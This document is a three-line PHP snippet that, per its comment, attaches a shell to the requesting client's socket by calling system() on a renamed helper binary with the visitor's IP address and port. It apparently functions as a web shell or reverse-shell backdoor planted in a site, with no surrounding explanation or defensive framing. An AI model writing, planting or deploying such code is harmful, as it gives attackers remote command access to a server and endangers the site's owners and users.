<?php
// The client socket is selected and the helper attaches a shell to it.
system("./renamed-helper " . $_SERVER['REMOTE_ADDR'] . " " . $_SERVER['REMOTE_PORT']);
